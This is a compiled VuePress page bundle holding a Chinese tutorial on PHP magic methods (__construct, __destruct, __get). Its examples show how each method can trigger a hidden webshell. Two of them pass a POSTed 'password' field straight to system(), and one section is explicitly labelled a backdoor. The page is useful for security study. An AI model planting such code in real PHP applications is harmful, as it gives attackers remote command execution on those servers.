import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as n,c as i,e as s}from"./app-d99091c8.js";const d={},l=s(`<h1 id="php魔术方法" tabindex="-1"><a class="header-anchor" href="#php魔术方法" aria-hidden="true">#</a> php魔术方法</h1><h2 id="construct-——构造方法" tabindex="-1"><a class="header-anchor" href="#construct-——构造方法" aria-hidden="true">#</a> __construct()——构造方法</h2><p>触发条件：在对象实例化的时候自动触发</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>red  
&lt;?php  
  
class test1{  
    function post() {  
        return $_POST[&#39;password&#39;];  
    }  
}  
class test2 extends test1 {  
    public $code;  
    function __construct()  
    {  
        echo &quot;&lt;br&gt;&quot;.&quot;调用成功&quot;.&quot;&lt;br&gt;&quot;;  
        $this-&gt;code = parent::post();  
    }  
    public function getcode()  
    {  
        return $this-&gt;code;  
    }  
}  
$fff = new test2;  
$zzz = new test1;  
echo($fff-&gt;getcode()); //将post方法传递出来

?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="destruct-——析构方法" tabindex="-1"><a class="header-anchor" href="#destruct-——析构方法" aria-hidden="true">#</a> __destruct()——析构方法</h2><p>触发条件：在销毁对象的时候自动触发（配合unset使用）</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>red  
&lt;?php  
  
class test1{  
    function post() {  
        return $_POST[&#39;password&#39;];  
    }  
}  
class test2 extends test1 {  
  
    function __destruct()  
    {  
        echo &quot;&lt;br&gt;&quot;.&quot;调用成功&quot;.&quot;&lt;br&gt;&quot;;  
        $code = parent::post();  
        system($code);  
    }  
}  
$fff = new test2;  
unset($fff);  
  
?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="get-——访问后门" tabindex="-1"><a class="header-anchor" href="#get-——访问后门" aria-hidden="true">#</a> __get()——访问后门</h2><p>触发条件：访问私有类成员属性的时候自动触发</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>red  
&lt;?php  
  
class test1{  
    function post() {  
        return $_POST[&#39;password&#39;];  
    }  
}  
class test2 extends test1 {  
    private $a = 1;  
    function __get($a)  
    {  
        echo &quot;&lt;br&gt;&quot;.&quot;调用成功&quot;.&quot;&lt;br&gt;&quot;;  
        $code = parent::post();  
        system($code);  
    }  
} 

$fff = new test2;
echo $fff -&gt; a;

?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,10),t=[l];function a(r,v){return n(),i("div",null,t)}const m=e(d,[["render",a],["__file","php魔术方法.html.vue"]]);export{m as default};
